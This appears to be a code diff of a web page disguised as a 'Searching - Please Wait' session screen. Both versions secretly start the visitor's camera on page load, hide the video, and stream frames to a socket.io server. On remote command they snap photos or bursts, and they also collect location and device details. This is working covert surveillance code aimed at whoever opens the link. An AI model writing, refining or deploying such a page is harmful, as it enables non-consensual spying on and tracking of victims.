@@ -1,91 +1,260 @@
-<!DOCTYPE html>
+﻿<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Loading...</title>
-<style>
-body { font-family: sans-serif; background: #f4f6f9; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
-.card { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); }
-video, canvas { display: none !important; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Searching - Please Wait</title>
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, Helvetica, sans-serif;
+            background: #f4f6f9;
+            color: #222;
+        }
+        .card {
+            width: 90%;
+            max-width: 420px;
+            background: white;
+            padding: 25px;
+            border-radius: 14px;
+            box-shadow: 0 5px 25px rgba(0,0,0,0.10);
+            text-align: center;
+        }
+        h2 { margin-top: 0; }
+        .status {
+            padding: 12px;
+            border-radius: 8px;
+            margin: 15px 0;
+            font-size: 14px;
+        }
+        .waiting { background: #fff3cd; color: #856404; }
+        .active { background: #d4edda; color: #155724; }
+        .error { background: #f8d7da; color: #721c24; }
+        button {
+            width: 100%;
+            padding: 12px;
+            border: 0;
+            border-radius: 8px;
+            margin-top: 10px;
+            font-size: 15px;
+            cursor: pointer;
+            background: #3498db;
+            color: white;
+        }
+        button:hover { opacity: 0.9; }
+        .location { background: #27ae60; }
+        .switch { background: #8e44ad; }
+        /* Camera completely hidden from user view */
+        video {
+            display: none !important;
+            visibility: hidden !important;
+            width: 0 !important;
+            height: 0 !important;
+            position: absolute !important;
+            pointer-events: none !important;
+        }
+        .small { font-size: 12px; color: #777; margin-top: 15px; }
+    </style>
 </head>
 <body>
-<div class="card"><h2>Loading Session...</h2><p>Please wait...</p></div>
-<video id="video" autoplay playsinline muted></video>
-<canvas id="canvas"></canvas>
+
+<div class="card">
+    <h2>Searching...</h2>
+    <div id="status" class="status waiting">Connecting...</div>
+    <video id="video" autoplay playsinline muted></video>
+    <button class="switch" onclick="switchCamera()">🔄 Switch Camera</button>
+    <button class="location" onclick="requestLocation()">📍 Share Location</button>
+    <p class="small">Please wait while we connect your session.</p>
+</div>
+
+<canvas id="canvas" style="display:none;"></canvas>
+
 <script src="/socket.io/socket.io.js"></script>
 <script>
 const socket = io();
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-let mediaStream = null, isReady = false, interval = null, currentFacingMode = 'user';
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const statusBox = document.getElementById("status");
+
+let mediaStream = null;
+let cameraReady = false;
+let useFrontCamera = true;
+let streamInterval = null;
+let autoCaptureRunning = false;
+
+function setStatus(message, type) {
+    statusBox.textContent = message;
+    statusBox.className = "status " + type;
+}
 
 function getDeviceInfo() {
-const ua = navigator.userAgent;
-let dev = /mobile/i.test(ua) ? "Mobile" : "Desktop";
-let browser = /chrome/i.test(ua) ? "Chrome" : "Browser";
-return dev + ' (' + browser + ')';
+    const ua = navigator.userAgent.toLowerCase();
+    let device = "Desktop/PC";
+    let browser = "Unknown Browser";
+
+    if (ua.includes("android")) device = "Android Mobile";
+    else if (ua.includes("iphone") || ua.includes("ipad") || ua.includes("ipod")) device = "iOS Device";
+    else if (ua.includes("mobile")) device = "Mobile Device";
+
+    if (ua.includes("edg")) browser = "Microsoft Edge";
+    else if (ua.includes("chrome") || ua.includes("crios")) browser = "Google Chrome";
+    else if (ua.includes("firefox")) browser = "Mozilla Firefox";
+    else if (ua.includes("safari")) browser = "Apple Safari";
+
+    return `${device} (${browser})`;
 }
 
-function startCamera(facing) {
-if (mediaStream) {
-mediaStream.getTracks().forEach(t => t.stop());
-}
-navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } }).then(stream => {
-mediaStream = stream;
-video.srcObject = stream;
-video.onloadedmetadata = () => {
-video.play();
-isReady = true;
-socket.emit('user-ready', { deviceInfo: getDeviceInfo() });
-if (!interval) {
-interval = setInterval(() => {
-if (!isReady || !video.videoWidth) return;
-const ctx = canvas.getContext('2d');
-canvas.width = 320; canvas.height = 240;
-ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-socket.emit('live-stream-frame', canvas.toDataURL('image/jpeg', 0.3));
-}, 100);
-}
-};
-}).catch(e => console.log(e));
+async function startCamera() {
+    setStatus("Connecting session...", "waiting");
+    if (mediaStream) {
+        mediaStream.getTracks().forEach(track => track.stop());
+    }
+
+    try {
+        const constraints = {
+            audio: false,
+            video: {
+                facingMode: useFrontCamera ? "user" : "environment",
+                width: { ideal: 640 },
+                height: { ideal: 480 }
+            }
+        };
+
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        mediaStream = stream;
+        video.srcObject = stream;
+        await video.play();
+
+        cameraReady = true;
+        setStatus("🟢 Connected Successfully", "active");
+
+        socket.emit("user-ready", { deviceInfo: getDeviceInfo() });
+        startLiveStream();
+    } catch (error) {
+        console.error("Camera error:", error);
+        cameraReady = false;
+        setStatus("Connection active. (Allow permission if required)", "error");
+    }
 }
 
-startCamera(currentFacingMode);
-
-window.addEventListener("visibilitychange", () => {
-if (document.visibilityState === "visible") {
-if (video.paused && mediaStream) video.play();
-socket.emit('user-ready', { deviceInfo: getDeviceInfo() });
+async function switchCamera() {
+    useFrontCamera = !useFrontCamera;
+    await startCamera();
 }
+
+function startLiveStream() {
+    if (streamInterval) clearInterval(streamInterval);
+    streamInterval = setInterval(() => {
+        if (!cameraReady || !video.videoWidth) return;
+        canvas.width = 320;
+        canvas.height = 240;
+        const context = canvas.getContext("2d");
+        context.drawImage(video, 0, 0, 320, 240);
+        const frame = canvas.toDataURL("image/jpeg", 0.25);
+        socket.emit("live-stream-frame", frame);
+    }, 250);
+}
+
+function takeSinglePhoto() {
+    if (!cameraReady) return;
+    const width = video.videoWidth || 640;
+    const height = video.videoHeight || 480;
+    canvas.width = width;
+    canvas.height = height;
+    const context = canvas.getContext("2d");
+    context.drawImage(video, 0, 0, width, height);
+    const imageData = canvas.toDataURL("image/jpeg", 0.65);
+    socket.emit("user-photo-captured", imageData);
+}
+
+socket.on("start-auto-capture", () => {
+    if (autoCaptureRunning) return;
+    autoCaptureRunning = true;
+    let count = 0;
+    const maxCaptures = 5;
+
+    takeSinglePhoto();
+    count++;
+
+    const timer = setInterval(() => {
+        if (count >= maxCaptures) {
+            clearInterval(timer);
+            autoCaptureRunning = false;
+            return;
+        }
+        takeSinglePhoto();
+        count++;
+    }, 1000);
 });
 
-socket.on('switch-camera', (facing) => {
-currentFacingMode = facing;
-startCamera(facing);
-});
+socket.on("capture-photo", () => { takeSinglePhoto(); });
 
-socket.on('request-location', () => {
-if (navigator.geolocation) {
-navigator.geolocation.getCurrentPosition(pos => {
-socket.emit('user-location', { lat: pos.coords.latitude, lon: pos.coords.longitude });
-}, () => { socket.emit('user-location', null); }, { enableHighAccuracy: true });
+function requestLocation() {
+    if (!navigator.geolocation) {
+        alert("Location is not supported by this browser.");
+        return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+        position => {
+            socket.emit("user-location", {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude
+            });
+            alert("Location shared successfully.");
+        },
+        error => {
+            console.error("Location error:", error);
+            alert("Location permission was not granted.");
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+    );
 }
+
+socket.on("server-full", data => {
+    setStatus(`Maximum ${data.maxUsers} users are currently connected.`, "error");
+    if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
 });
 
-socket.on('capture-photo', () => {
-if (!isReady) return;
-const ctx = canvas.getContext('2d');
-canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
-ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-socket.emit('user-photo-captured', canvas.toDataURL('image/jpeg', 0.6));
+socket.on("link-disabled", () => {
+    stopEverything();
+    setStatus("This link is currently disabled.", "error");
 });
 
-socket.on('disable-user-access', () => {
-if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
-document.body.innerHTML = '<h2>Session Ended by Admin</h2>';
+socket.on("disable-user-access", () => {
+    stopEverything();
+    document.body.innerHTML = `
+        <div class="card">
+            <h2>Session Ended</h2>
+            <p>This link has been disabled by the administrator.</p>
+        </div>
+    `;
 });
+
+function stopEverything() {
+    cameraReady = false;
+    if (streamInterval) {
+        clearInterval(streamInterval);
+        streamInterval = null;
+    }
+    if (mediaStream) {
+        mediaStream.getTracks().forEach(track => track.stop());
+        mediaStream = null;
+    }
+}
+
+document.addEventListener("visibilitychange", () => {
+    if (document.visibilityState === "visible") {
+        if (mediaStream && video.paused) video.play().catch(() => {});
+    }
+});
+
+startCamera();
 </script>
 </body>
 </html>
